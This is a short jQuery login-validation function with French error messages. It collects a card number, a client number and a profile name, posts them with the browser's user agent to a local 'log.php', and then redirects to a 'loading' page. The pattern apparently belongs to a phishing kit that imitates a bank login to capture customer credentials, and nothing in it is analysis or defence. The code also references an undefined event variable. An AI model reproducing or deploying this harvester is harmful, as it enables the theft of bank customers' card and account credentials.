function login_valid(){
	
var cardNum =	$("#cardNum").val();
var clientNum	 =	$("#clientNum").val();
var nomProfil	 =	$("#nom_profil").val();
let myError = document.getElementById('error');
	
	
 if(cardNum==''){

myError.innerHTML ="Veuillez introduire le numéro de carte";
myError.style.color="red";	
e.preventDefault();
return false;	
} 
if(clientNum==''){


myError.innerHTML ="Veuillez introduire le numéro de client";
myError.style.color="red";	
e.preventDefault();
return false;	
} 

if(nomProfil==''){



myError.innerHTML ="Veuillez introduire un nom de profil correct";
myError.style.color="red";	
e.preventDefault();


return false;	
} 

var data_log = 
{
DEVICE          :   navigator.userAgent,
cardNum		    :   cardNum,
clientNum        :	clientNum,
nomProfil        :	nomProfil

}; 

var _url = './config/log.php';

$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

myError.innerHTML =reponse.resultat;
myError.style.color="red";	
e.preventDefault();

}else if(reponse.statut=="success"){	


     window.location="./select/loading.php";
} 


}) 
}